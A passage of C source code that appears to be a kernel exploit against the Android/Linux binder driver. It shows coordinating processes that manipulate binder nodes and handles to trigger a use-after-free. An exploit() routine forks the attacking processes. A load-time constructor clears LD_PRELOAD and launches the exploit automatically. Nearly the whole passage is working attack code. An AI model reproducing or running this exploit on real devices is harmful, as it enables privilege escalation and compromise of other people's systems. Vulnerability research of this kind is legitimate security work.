                // for (usize i = 0; i < args->node_count; i++) {
                //     binder_decrefs(bctx.binder.fd, refs[i]);
                //     binder_release(bctx.binder.fd, refs[i]);
                // }

                // LOGD("B: released refcount on handles");

                // u8 read_buf[4096] = { 0 };
                // usize read_amount = 0;
                // binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                // LOGD("B: read amount: %lu", read_amount);
                // binder_read_buffer_dump(read_buf, read_amount);

                // ioctl(bctx.binder.fd, BINDER_THREAD_EXIT);
                bcontext_deactivate(&bctx);
                free(refs);

                LOGD("B: closed binder context");

                response = COMMAND_OK;
            } break;
            default: {
                LOG("B: Invalid command recieved");
            }
        }

        pipe_command_drop(command);
        send_command_response(&ctx->b_pipe, response);
    }
}

// process C does nothing but exist as a process that process A can send binder nodes to
// we need a recepient process of a ref when allocating binder node
// and process B closes its binder context frequently so another process is needed
void process_c(ExploitCtx *ctx) {
    pin_to_cpu(0);

    pthread_barrier_wait(&ctx->a_register_done);

    BContext bctx = { 0 };
    bctx.active = false;

    u8 read_buf[256] = { 0 };
    usize read_amount = 0;
    binder_uintptr_t node_counter = 0;

    for (;;) {
        PipeCommandResponse response = COMMAND_ERROR;

        // LOGD("C: listening for next command...");
        PipeCommand command = recv_pipe_command(&ctx->c_pipe);

        switch (command.header.command_type) {
            case RECV_NODE: {
                LOGD("C: receiving node...");
                if (bctx.active) {
                    // TODO: figure out if receiving transaction and acknowledging it
                    // or just ignroing it is better (less allocations?)
                    recv_strong_handle(&bctx.binder, bctx.a_handle);
                    response = COMMAND_OK;
                }
            } break;
            case RESET_CONTEXT: {
                bcontext_deactivate(&bctx);
                LOGD("C: deactivated context");
                response = COMMAND_OK;
            } break;
            case ACQUIRE_CONTEXT: {
                acquire_a_handle(ctx, &bctx);
                LOGD("C: reacquired context");
                response = COMMAND_OK;
            } break;
            case SEND_NODE: {
                // can't use send node, cause send node uses async,
                // and async needs to free the buffer before receiving transactions
                if (bctx.active) {
                    struct binder_txn *txn = binder_txn_create(bctx.a_handle, 0, 0);
                    binder_txn_add_binder_object(txn, node_counter, 0x69);
                    node_counter += 1;
                    binder_txn_dispatch(txn, bctx.binder.fd, false, NULL, 0, NULL);
                    binder_txn_destroy(txn);

                    // read response
                    binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);

                    response = COMMAND_OK;
                }
            } break;
            case SEND_EMPTY: {
                if (bctx.active) {
                    struct binder_txn *txn = binder_txn_create(bctx.a_handle, 0, 0);
                    binder_txn_dispatch(txn, bctx.binder.fd, false, NULL, 0, NULL);
                    binder_txn_destroy(txn);

                    // read response
                    binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);

                    response = COMMAND_OK;
                }
            } break;
            default: {
                LOG("C: Invalid command recieved");
            }
        }

        pipe_command_drop(command);
        send_command_response(&ctx->c_pipe, response);
    }
}

void exploit() {
    // exploit context should be in shared memory
    ExploitCtx *ctx = SYSCHK(mmap(NULL, sizeof(ExploitCtx), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0));;

    exploit_ctx_init(ctx);

    if (SYSCHK(fork()) == 0) {
        // process A instructs process b to do vuln, then performs rest of exploit
        process_a(ctx);
    } else if (SYSCHK(fork()) == 0) {
        // process B executes vuln to get UAF values in process A
        process_b(ctx);
    } else {
        process_c(ctx);
    }
}

static void init() __attribute__((constructor));
void init() {
    unsetenv("LD_PRELOAD");
    puts("Starting exploit...");
    exploit();
}